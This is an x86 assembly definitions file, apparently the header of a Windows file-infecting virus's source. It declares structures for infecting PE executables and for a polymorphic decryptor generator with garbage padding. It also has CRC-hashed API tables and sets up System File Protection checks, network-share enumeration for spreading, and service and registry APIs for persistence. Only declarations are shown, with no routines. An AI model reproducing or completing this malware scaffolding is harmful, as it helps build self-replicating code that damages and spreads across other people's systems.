   MAX_PATH                        equ     260

   FILE_ATTRIBUTE_HIDDEN           equ     00000002h
   FILE_ATTRIBUTE_DIRECTORY        equ     00000010h
   FILE_ATTRIBUTE_NORMAL           equ     00000080h
   FILE_FLAG_RANDOM_ACCESS         equ     10000000h

   CREATE_ALWAYS                   equ     2
   OPEN_EXISTING                   equ     3

   GENERIC_WRITE                   equ     40000000h
   GENERIC_READ                    equ     80000000h

   GMEM_FIXED                      equ     0
   GMEM_ZEROINIT                   equ     40h

   REG_SZ                          equ     1

   HKEY_CURRENT_USER               equ     80000001h
   HKEY_LOCAL_MACHINE              equ     80000002h
   HKEY_USERS                      equ     80000003h

   SC_MANAGER_CREATE_SERVICE       equ     2

   SERVICE_START                   equ     10h
   SERVICE_WIN32_OWN_PROCESS       equ     10h
   SERVICE_AUTO_START              equ     2

   DRIVE_FIXED                     equ     3
   DRIVE_REMOTE                    equ     4

   IMAGE_FILE_MACHINE_I386         equ     14ch    ;14d/14e do not exist.  if you don't believe, then try it

   IMAGE_FILE_RELOCS_STRIPPED      equ     0001h
   IMAGE_FILE_EXECUTABLE_IMAGE     equ     0002h
   IMAGE_FILE_32BIT_MACHINE        equ     0100h
   IMAGE_FILE_SYSTEM               equ     1000h
   IMAGE_FILE_DLL                  equ     2000h
   IMAGE_FILE_UP_SYSTEM_ONLY       equ     4000h

   IMAGE_SUBSYSTEM_WINDOWS_GUI     equ     2
   IMAGE_SUBSYSTEM_WINDOWS_CUI     equ     3

   SECTION_MAP_WRITE               equ     0002h

   FILE_MAP_WRITE                  equ     SECTION_MAP_WRITE

   PAGE_READWRITE                  equ     04

   RANDPADMIN                      equ     4096
   RANDPADMAX                      equ     2048 ;RANDPADMIN is added to this

   RESOURCE_GLOBALNET              equ     2

   RESOURCETYPE_DISK               equ     00000001

   ERROR_MORE_DATA                 equ     234

   RESOURCEUSAGE_CONNECTABLE       equ     00000001
   RESOURCEUSAGE_CONTAINER         equ     00000002

   MAX_PREFERRED_LENGTH            equ     0ffffffffh
   LM20_NNLEN                      equ     12

   statelen                        equ     624
   period                          equ     397

   tshiftU                         equ     0bh
   tshiftS                         equ     7
   tmaskB                          equ     9d2c5680h
   tshiftT                         equ     0fh
   tmaskC                          equ     0efc60000h
   tshiftL                         equ     12h
   matrixA                         equ     9908b0dfh

   grbgsize                        equ     8192    ;power of 2
   tblsize                         equ     256     ;fixed (xlat table)
   randsize                        equ     4096    ;power of 2, vsize + randsize must be < 8192, else stack fault

   ;so: grbgsize garbage, table, grbgsize garbage, buffer, randsize garbage
   ;or: grbgsize garbage, buffer, randsize garbage, table, grbgsize garbage

   decsize                         equ     20h     ;very small :) must be >= 20h

   ;global state
   state_decdown                   equ     1       ;else up
   state_esifirst                  equ     2       ;else ebx first
   state_pushret                   equ     4       ;else jmp esp
   state_pushb                     equ     8       ;push at begin else push at end
   state_movesi                    equ     10h     ;else lodsb
   state_movedi                    equ     20h     ;else stosb
   state_jg                        equ     40h     ;jl(e)/jb(e) else jg(e)/jnb(e)

   ;block 1 state                                  ;log2, not bit value
   state_loadebx                   equ     0       ;hard-coded
   state_loadesi                   equ     1
   state_entered                   equ     2
   state_loadedi                   equ     3
   state_std                       equ     4
   state_pushreg1                  equ     5

   block1and                       equ     7
   block1cmp                       equ     6
   block1done                      equ     (1 shl state_loadebx) or (1 shl state_loadesi) or (1 shl state_entered) \
                                           or (1 shl state_loadedi) or (1 shl state_std) or (1 shl state_pushreg1)

   ;block 2 state
   state_lods                      equ     0
   state_xlat                      equ     1
   state_stos                      equ     2
   state_incesi                    equ     3
   state_incedi                    equ     4
   state_cmp                       equ     5
   state_branch                    equ     6
   state_pushreg2                  equ     7       ;hard-coded
   state_ret                       equ     1       ;state_esifirst overloaded

   block2and                       equ     0fh
   block2cmp                       equ     9

   vsize                           equ     (offset efishnc_codeend - offset efishnc_inf + 3) and -4

   align           1                               ;byte-packed structures
   expcrcstk       struct
           pWriteProcessMemory     dd      ?
           pWriteFile              dd      ?
           pWinExec                dd      ?
           pSetFileAttributesA     dd      ?
           pMoveFileA              dd      ?
           pLoadLibraryA           dd      ?
           pGlobalFree             dd      ?
           pGlobalAlloc            dd      ?
           pGetWindowsDirectoryA   dd      ?
           pGetTickCount           dd      ?
           pGetTempFileNameA       dd      ?
           pGetFileAttributesA     dd      ?
           pGetCurrentProcess      dd      ?
           pDeleteFileA            dd      ?
           pCreateFileA            dd      ?
           pCloseHandle            dd      ?
   expcrcstk       ends
   expcrc_count    equ     size expcrcstk shr 2

   regcrcstk       struct
           rRegSetValueA           dd      ?
           rRegCreateKeyA          dd      ?
           rRegCloseKey            dd      ?
           rOpenSCManagerA         dd      ?
           rCreateServiceA         dd      ?
           rCloseServiceHandle     dd      ?
   regcrcstk       ends
   regcrc_count    equ     size regcrcstk shr 2

   popsize         equ     0ch + size regcrcstk + size expcrcstk

   execrcstk       struct
           eLoadLibraryA           dd      ?
           eGlobalAlloc            dd      ?
           eGetVersion             dd      ?
           eGetTickCount           dd      ?
           eGetStartupInfoW        dd      ?
           eGetStartupInfoA        dd      ?
           eGetCommandLineW        dd      ?
           eGetCommandLineA        dd      ?
           eExitProcess            dd      ?
           eCreateProcessW         dd      ?
           eCreateProcessA         dd      ?
   execrcstk       ends
   execrc_count    equ     size execrcstk shr 2

   usrcrcstk       struct
           uCharNextW      dd      ?
           uCharNextA      dd      ?
   usrcrcstk       ends
   usrcrc_count    equ     size usrcrcstk shr 2

   svccrcstk       struct
           sStartServiceCtrlDispatcherA    dd      ?
   svccrcstk       ends
   svccrc_count    equ     size svccrcstk shr 2

   startupinfo     struct
           sicb                    dd      ?
           siReserved              dd      ?
           siDesktop               dd      ?
           siTitle                 dd      ?
           sidwX                   dd      ?
           sidwY                   dd      ?
           sidwXSize               dd      ?
           sidwYSize               dd      ?
           sidwXCountChars         dd      ?
           sidwYCountChars         dd      ?
           sidwFillAttribute       dd      ?
           sidwFlags               dd      ?
           siwShowWindow           dw      ?
           sicbReserved2           dw      ?
           silpReserved2           dd      ?
           sihStdInput             dd      ?
           sihStdOutput            dd      ?
           sihStdError             dd      ?
   startupinfo     ends

   processinfo     struct
           pihProcess      dd      ?
           pihThread       dd      ?
           pidwProcessId   dd      ?
           pidwThreadId    dd      ?
   processinfo     ends

   krncrcstk       struct
           klstrlenW               dd      ?
           klstrcpyW               dd      ?
           klstrcatW               dd      ?
           kUnmapViewOfFile        dd      ?
           kSleep                  dd      ?
           kSetFileTime            dd      ?
           kSetFileAttributesW     dd      ?
           kSetFileAttributesA     dd      ?
           kSetCurrentDirectoryW   dd      ?
           kSetCurrentDirectoryA   dd      ?
           kMultiByteToWideChar    dd      ?
           kMapViewOfFile          dd      ?
           kLoadLibraryA           dd      ?
           kGlobalFree             dd      ?
           kGlobalAlloc            dd      ?
           kGetVersion             dd      ?
           kGetTickCount           dd      ?
           kGetFullPathNameW       dd      ?
           kGetFullPathNameA       dd      ?
           kGetDriveTypeA          dd      ?
           kFindNextFileW          dd      ?
           kFindNextFileA          dd      ?
           kFindFirstFileW         dd      ?
           kFindFirstFileA         dd      ?
           kFindClose              dd      ?
           kCreateThread           dd      ?
           kCreateFileMappingA     dd      ?
           kCreateFileW            dd      ?
           kCreateFileA            dd      ?
           kCloseHandle            dd      ?
   krncrcstk       ends
   krncrc_count    equ     size krncrcstk shr 2

   sfccrcstk       struct
           sSfcIsFileProtected     dd      ?
   sfccrcstk       ends
   sfccrc_count    equ     size sfccrcstk shr 2

   netcrcstk       struct
           nWNetOpenEnumW          dd      ?
           nWNetOpenEnumA          dd      ?
           nWNetEnumResourceW      dd      ?
           nWNetEnumResourceA      dd      ?
           nWNetCloseEnum          dd      ?
   netcrcstk       ends
   netcrc_count    equ     size netcrcstk shr 2

   ip9xcrcstk      struct
           ip9xNetShareEnum        dd      ?
   ip9xcrcstk      ends
   ip9xcrc_count   equ     size ip9xcrcstk shr 2

   ipntcrcstk      struct
           ipntNetShareEnum        dd      ?
           ipntNetApiBufferFree    dd      ?
   ipntcrcstk      ends
   ipntcrc_count   equ     size ipntcrcstk shr 2

   coffhdr         struct
           pemachine       dw      ?               ;04
           pesectcount     dw      ?               ;06
           petimedate      dd      ?               ;08
           pesymbrva       dd      ?               ;0C
           pesymbcount     dd      ?               ;10
           peopthdrsize    dw      ?               ;14
           peflags         dw      ?               ;16
   coffhdr         ends

   pedir           struct
           dirrva          dd      ?
           dirsize         dd      ?
   pedir           ends

   pehdr           struct
           pesig           dd      ?               ;00
           pecoff          coffhdr <?>
           pemagic         dw      ?               ;18
           pemajorlink     db      ?               ;1A
           peminorlink     db      ?               ;1B
           pecodesize      dd      ?               ;1C
           peidatasize     dd      ?               ;20
           peudatasize     dd      ?               ;24
           peentrypoint    dd      ?               ;28
           pecodebase      dd      ?               ;2C
           pedatabase      dd      ?               ;30
           peimagebase     dd      ?               ;34
           pesectalign     dd      ?               ;38
           pefilealign     dd      ?               ;3C
           pemajoros       dw      ?               ;40
           peminoros       dw      ?               ;42
           pemajorimage    dw      ?               ;44
           peminorimage    dw      ?               ;46
           pemajorsubsys   dw      ?               ;48
           peminorsubsys   dw      ?               ;4A
           pereserved      dd      ?               ;4C
           peimagesize     dd      ?               ;50
           pehdrsize       dd      ?               ;54
           pechksum        dd      ?               ;58
           pesubsys        dw      ?               ;5C
           pedllflags      dw      ?               ;5E
           pestackmax      dd      ?               ;60
           pestacksize     dd      ?               ;64
           peheapmax       dd      ?               ;68
           peheapsize      dd      ?               ;6C
           peldrflags      dd      ?               ;70
           pervacount      dd      ?               ;74
           peexport        pedir   <?>             ;78
           peimport        pedir   <?>             ;80
           persrc          pedir   <?>             ;88
           peexcpt         pedir   <?>             ;90
           pesecurity      pedir   <?>             ;98
           pereloc         pedir   <?>             ;A0
           pedebug         pedir   <?>             ;A8
           pearch          pedir   <?>             ;B0
           peglobal        pedir   <?>             ;B8
           petls           pedir   <?>             ;C0
           peconfig        pedir   <?>             ;C8
           pebound         pedir   <?>             ;D0
           peiat           pedir   <?>             ;D8
           pedelay         pedir   <?>             ;E0
           pecom           pedir   <?>             ;E8
           persrv          pedir   <?>             ;F0
   pehdr           ends

   peexp           struct
           expflags        dd      ?
           expdatetime     dd      ?
           expmajorver     dw      ?
           expminorver     dw      ?
           expdllrva       dd      ?
           expordbase      dd      ?
           expadrcount     dd      ?
           expnamecount    dd      ?
           expadrrva       dd      ?
           expnamerva      dd      ?
           expordrva       dd      ?
   peexp           ends

   mzhdr           struct
           mzsig           dw      ?               ;00
           mzpagemod       dw      ?               ;02
           mzpagediv       dw      ?               ;04
           mzrelocs        dw      ?               ;06
           mzhdrsize       dw      ?               ;08
           mzminalloc      dw      ?               ;0A
           mzmaxalloc      dw      ?               ;0C
           mzss            dw      ?               ;0E
           mzsp            dw      ?               ;10
           mzchksum        dw      ?               ;12
           mzip            dw      ?               ;14
           mzcs            dw      ?               ;16
           mzreloff        dw      ?               ;18
           mzfiller        db      22h dup (?)     ;1A
           mzlfanew        dd      ?               ;3C
   mzhdr   ends

   tib             struct
           ExceptReg       dd      ?
           StackBase       dd      ?
           StackLimit      dd      ?
           SubSystem       dd      ?
           FiberData       dd      ?
           UserPointer     dd      ?
           TibSelf         dd      ?
           TibUnknown      dd      5 dup (?)
           TibTeb          dd      ?
   tib             ends

   teb             struct
           tebUnknown      dd      6 dup (?)
           heaphand        dd      ?
           tebUnknown2     dd      ?
           procflags       dd      ?
   teb             ends

   FILETIME        struct
           dwLowDateTime   dd      ?
           dwHighDateTime  dd      ?
   FILETIME        ends

   WIN32_FIND_DATA struct
           dwFileAttributes        dd              ?
           ftCreationTime          FILETIME        <?>
           ftLastAccessTime        FILETIME        <?>
           ftLastWriteTime         FILETIME        <?>
           dwFileSizeHigh          dd              ?
           dwFileSizeLow           dd              ?
           dwReserved0             dd              ?
           dwReserved1             dd              ?
           cFileName               dw              260 dup (?)
           cAlternateFileName      dw              14 dup (?)
   WIN32_FIND_DATA ends

   findlist        struct
           findprev        dd                      ?
           findhand        dd                      ?
           finddata        WIN32_FIND_DATA         <?>
   findlist        ends

   sehstruc        struct
           sehkrnlret      dd      ?
           sehexcptrec     dd      ?
           sehprevseh      dd      ?
   sehstruc        ends

   pesect          struct
           sectname        db      8 dup (?)
           sectvirtsize    dd      ?
           sectvirtaddr    dd      ?
           sectrawsize     dd      ?
           sectrawaddr     dd      ?
           sectreladdr     dd      ?
           sectlineaddr    dd      ?
           sectrelcount    dw      ?
           sectlinecount   dw      ?
           sectflags       dd      ?
   pesect          ends

   mapsehstk       struct
           mapsehprev      dd      ?
           mapsehexcpt     dd      ?
           mapsehregs      dd      8 dup (?)
           mapsehsehret    dd      ?
           mapsehinfret    dd      ?
   mapsehstk       ends

   mapstack        struct
           mapfilesize     dd      ?
           mapmapret       dd      ?
           mapinfret       dd      ?
           mapattrib       dd      ?
   mapstack        ends

   infectstk       struct
           infcopysrc      dd              ?
           infcopydst      dd              ?
           infcopysize     dd              ?
           infmapview      dd              ?
           inffilesize     dd              ?
           infseh          mapsehstk       <?>
   infectstk       ends

   NETRESOURCE     struct
           dwScope         dd      ?
           dwType          dd      ?
           dwDisplayType   dd      ?
           dwUsage         dd      ?
           lpLocalName     dd      ?
           lpRemoteName    dd      ?
           lpComment       dd      ?
           lpProvider      dd      ?
   NETRESOURCE     ends

   wnetlist        struct
           wnetprev        dd      ?
           wnethand        dd      ?
   wnetlist        ends

   SERVICE_TABLE_ENTRY     struct
           lpServiceName   dd      ?
           lpServiceProc   dd      ?
           lpServiceName0  dd      ?
           lpServiceProc0  dd      ?
   SERVICE_TABLE_ENTRY     ends

   share_info_1nt  struct
           shi1_netnament          dd      ?
           shi1_typent             dd      ?
           shi1_remarknt           dd      ?
   share_info_1nt  ends

   share_info_19x  struct
           shi1_netname9x          db      LM20_NNLEN + 1 dup (?)
           shi1_pad1               db      ?
           shi1_type9x             dw      ?
           shi1_remark9x           dd      ?
   share_info_19x  ends

   align                                           ;restore default alignment
